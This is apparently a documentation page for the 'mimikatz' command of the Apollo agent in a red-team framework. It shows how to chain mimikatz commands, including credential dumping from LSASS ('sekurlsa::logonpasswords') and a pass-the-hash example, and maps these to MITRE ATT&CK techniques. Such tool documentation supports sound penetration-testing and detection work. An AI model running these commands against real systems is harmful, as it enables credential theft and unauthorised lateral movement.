+++
title = "mimikatz"
chapter = false
weight = 103
hidden = false
+++

{{% notice info %}}
Artifacts Generated: Process Create, Process Inject, Process Kill
{{% /notice %}}

## Summary
Execute one or more mimikatz commands.

### Arguments (Positional)
#### Command
The command you would like mimikatz to run. Some commands require certain privileges and may need the `token::elevate` Mimikatz command or the builtin equivalent [`getprivs`](/agents/apollo/commands/getprivs/) to be executed first.

The `mimikatz` binary takes space-separated commands. For example, if you wanted to ensure your token had the correct privileges before dumping LSASS, you could do `mimikatz token::elevate sekurlsa::logonpasswords` to first elevate your token before running `logonpasswords`. Due to this space-separated command list, if you wish to run a command that has arguments (or spaces in its command name), you'll need to encapsulate that command in _escaped_ quotes. 

## Usage
```
mimikatz -Command [command]
```

Example
```
mimikatz sekurlsa::logonpasswords
mimikatz -Command sekurlsa::logonpasswords

# Running one or more commands with spaces in the command name

mimikatz -Command \"privilege::debug\" \"sekurlsa::pth /domain:DOMAIN /user:USERNAME /ntlm:HASH\" exit
```

## See Also
- [dcsync](/agents/apollo/commands/dcsync/)
- [pth](/agents/apollo/commands/dcsync/)

## MITRE ATT&CK Mapping

- T1134
- T1098
- T1547
- T1555
- T1003
- T1207
- T1558
- T1552
- T1550

### Resrouces
- [mimikatz](https://github.com/gentilkiwi/mimikatz)
